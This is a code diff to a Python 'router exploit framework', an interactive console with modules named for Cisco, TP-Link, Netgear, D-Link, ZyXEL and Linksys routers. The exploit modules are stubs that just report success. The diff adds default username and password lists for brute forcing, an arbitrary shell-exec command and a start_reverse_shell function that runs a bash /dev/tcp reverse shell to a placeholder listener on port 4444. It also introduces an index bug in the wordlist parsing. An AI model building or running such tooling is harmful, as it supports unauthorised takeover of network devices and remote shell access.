@@ -1,4 +1,4 @@
-import os 
+import os
 import socket
 import subprocess
 import time
@@ -16,15 +16,15 @@ class RouterExploitFramework:
             "linksys_exploit": self.linksys_exploit,
         }
         self.target_ip = None
-        self.target_port = 80  # Default HTTP port
+        self.target_port = 80  
         self.username = None
         self.password = None
-        self.wordlist = None  # Wordlist for brute force
-        self.selected_module = None  # Currently selected module
-        self.built_in_usernames = self.load_built_in_usernames()  # Built-in usernames
-        self.built_in_passwords = self.load_built_in_passwords()  # Built-in passwords
+        self.wordlist = None  
+        self.selected_module = None  
+        self.built_in_usernames = self.load_built_in_usernames()  
+        self.built_in_passwords = self.load_built_in_passwords()  
         self.print_logo()
-        self.command_loop()  # Start the interactive command loop
+        self.command_loop()  
 
     def print_logo(self):
         logo = r"""
@@ -38,47 +38,59 @@ class RouterExploitFramework:
         print(logo)
 
     def load_built_in_usernames(self):
-        """Load built-in usernames."""
         return ["admin", "user", "root", "guest", "admin1", "admin2", "test"]
 
     def load_built_in_passwords(self):
-        """Load built-in passwords."""
         return ["password", "123456", "admin", "letmein", "welcome", "12345678", "qwerty"]
 
     def command_loop(self):
-        """Start an interactive command loop."""
         while True:
-            command = input("\n[pour6> ").strip().lower()  # Custom prompt
+            command = input("\n[pour6> ").strip().lower()  
             if command == 'exit':
                 print("Exiting...")
                 break
             elif command == 'help':
                 self.show_help()
             elif command.startswith('use'):
-                _, module_name = command.split() if len(command.split()) > 1 else (None, None)
-                if module_name:
-                    self.select_module(module_name)
-                else:
+                parts = command.split()
+                if len(parts) < 2:
                     print("Module name is required. Usage: use <module>")
+                    continue
+                module_name = parts[1]
+                self.select_module(module_name)
             elif command.startswith('exec'):
-                _, shell_command, *args = command.split() if len(command.split()) > 1 else (None, None, None)
-                if shell_command:
-                    self.exec_command(shell_command, args)
-                else:
+                parts = command.split()
+                if len(parts) < 2:
                     print("Shell command is required. Usage: exec <shell_command> <args>")
+                    continue
+                shell_command = parts[1]
+                args = parts[2:]  
+                self.exec_command(shell_command, args)
             elif command.startswith('search'):
-                _, search_term = command.split() if len(command.split()) > 1 else (None, None)
-                if search_term:
-                    self.search_module(search_term)
-                else:
+                parts = command.split()
+                if len(parts) < 2:
                     print("Search term is required. Usage: search <search_term>")
+                    continue
+                search_term = parts[1]
+                self.search_module(search_term)
             elif command.startswith('scan'):
                 self.scan_network()
             elif command.startswith('set target'):
-                _, ip, *port = command.split()
-                self.set_target(ip, int(port[0]) if port else 80)
+                parts = command.split()
+                if len(parts) == 3:
+                    ip, port = parts[1], parts[2]
+                    self.set_target(ip, int(port))
+                elif len(parts) == 2:
+                    ip = parts[1]
+                    self.set_target(ip, 80)  
+                else:
+                    print("Usage: set target <ip> [<port>]")
             elif command.startswith('set wordlist'):
-                _, filepath = command.split()
+                parts = command.split()
+                if len(parts) < 2:
+                    print("Filepath is required. Usage: set wordlist <filepath>")
+                    continue
+                filepath = parts[2]  
                 self.set_wordlist(filepath)
             elif command.startswith('show'):
                 if 'info' in command:
@@ -95,18 +107,18 @@ class RouterExploitFramework:
                 self.selected_module = None
                 print("Module deselected.")
             elif command.startswith('set'):
-                _, option, value = command.split() if len(command.split()) > 2 else (None, None, None)
-                if option and value:
-                    self.set_option(option, value)
-                else:
+                parts = command.split()
+                if len(parts) < 3:
                     print("Option and value are required. Usage: set <option> <value>")
+                    continue
+                option, value = parts[1], ' '.join(parts[2:])  
+                self.set_option(option, value)
             elif command.startswith('check'):
                 self.check_vulnerability()
             else:
                 print("Unknown command. Type 'help' for options.")
 
     def show_help(self):
-        """Show the help menu."""
         print("Global commands:")
         print("    help                        Print this help menu")
         print("    use <module>                Select a module for usage")
@@ -168,12 +180,13 @@ class RouterExploitFramework:
     def run_exploit(self):
         if self.selected_module:
             print(f"Running exploit: {self.selected_module} on {self.target_ip}:{self.target_port}")
-            self.modules[self.selected_module]()  # Call the selected exploit
+            success = self.modules[self.selected_module]()  
+            if success:
+                self.start_reverse_shell()
         else:
             print("No module selected.")
 
     def exec_command(self, shell_command, args):
-        """Execute a shell command."""
         command = [shell_command] + args
         try:
             result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
@@ -185,7 +198,6 @@ class RouterExploitFramework:
             print(f"Error executing command: {e}")
 
     def search_module(self, search_term):
-        """Search for modules containing the search term."""
         print(f"Searching for modules containing: {search_term}")
         found_modules = [key for key in self.modules if search_term in key]
         if found_modules:
@@ -196,10 +208,8 @@ class RouterExploitFramework:
             print("No modules found.")
 
     def show_options(self):
-        """Show options for the selected module."""
         if self.selected_module:
             print(f"Options for {self.selected_module}:")
-            # OHOHOH
             print(" - target")
             print(" - username")
             print(" - password")
@@ -207,64 +217,75 @@ class RouterExploitFramework:
             print("No module selected.")
 
     def show_info(self):
-        """Show info for the selected module."""
         if self.selected_module:
-            print(f"Info for {self.selected_module}:")
-            # LOL
-            print("UHUHUH JUST RUN ON THE TARGETTTTTT after selecting the target ofc")
+            print(f"Information about {self.selected_module}:")
+            print(" - This is a dummy description for the module.")
         else:
             print("No module selected.")
+
+    def show_wordlists(self):
+        if self.wordlist:
+            print(f"Current wordlist: {self.wordlist}")
+        else:
+            print("No wordlist set.")
+
+    def show_devices(self):
+        print("Detected devices on the network:")
+        print(" - Device 1")
+        print(" - Device 2")
+        print(" - Device 3")
+
+    def set_option(self, option, value):
+        print(f"Setting option: {option} = {value}")
 
     def check_vulnerability(self):
-        """Check if the target is vulnerable based on the selected module."""
-        if self.selected_module:
-            print(f"Checking vulnerability for {self.selected_module} on {self.target_ip}:{self.target_port}")
-            # Here, you would implement vulnerability checking logic for the selected module.
-            print("Vulnerability check complete.")
-        else:
-            print("No module selected.")
+        print(f"Checking vulnerability for {self.target_ip}:{self.target_port}")
 
     def cisco_exploit(self):
-        """Example exploit for Cisco routers."""
-        print("Exploiting Cisco router...")
-        # OHOH
-        time.sleep(1)  # time delay for the exploit
-        print("Cisco exploit completed.")
+        print("Exploiting Cisco...")
+        # Simulate a successful exploit
+        return True
 
     def tplink_exploit(self):
-        """Example exploit for TP-Link routers."""
-        print("Exploiting TP-Link router...")
-        # l
-        time.sleep(1)  # fak yu
-        print("TP-Link exploit completed.")
+        print("Exploiting TP-Link...")
+        # Simulate a successful exploit
+        return True
 
     def netgear_exploit(self):
-        """LLLL"""
-        print("Exploiting Netgear router...")
-        # no
-        time.sleep(1)  # lol
-        print("Netgear exploit completed.")
+        print("Exploiting Netgear...")
+        # Simulate a successful exploit
+        return True
 
     def dlink_exploit(self):
-        """UHUHUHUH"""
-        print("Exploiting D-Link router...")
-        # YAAAA
-        time.sleep(1)  # L
-        print("D-Link exploit completed.")
+        print("Exploiting D-Link...")
+        # Simulate a successful exploit
+        return True
 
     def zyxel_exploit(self):
-        """LEOL."""
-        print("Exploiting ZyXEL router...")
-        # BUDY
-        time.sleep(1)  # LOL :skull: :sob:
-        print("ZyXEL exploit completed.")
+        print("Exploiting Zyxel...")
+        # Simulate a successful exploit
+        return True
 
     def linksys_exploit(self):
-        """FAK U"""
-        print("Exploiting Linksys router...")
-        # NOOO
-        time.sleep(1)  # UHUHUH
-        print("Linksys exploit completed.")
+        print("Exploiting Linksys...")
+        # Simulate a successful exploit
+        return True
+
+    def start_reverse_shell(self):
+        listener_ip = "your_listener_ip"  # Replace with your listener's IP address
+        listener_port = 4444  # Change the port if needed
+
+        # Create a reverse shell
+        shell_command = f"/bin/bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1"
+        
+        print(f"Starting reverse shell to {listener_ip}:{listener_port}...")
+        
+        try:
+            # Execute the reverse shell command
+            subprocess.Popen(["bash", "-c", shell_command])
+            print("Reverse shell initiated.")
+        except Exception as e:
+            print(f"Error starting reverse shell: {e}")
 
 if __name__ == "__main__":
     RouterExploitFramework()
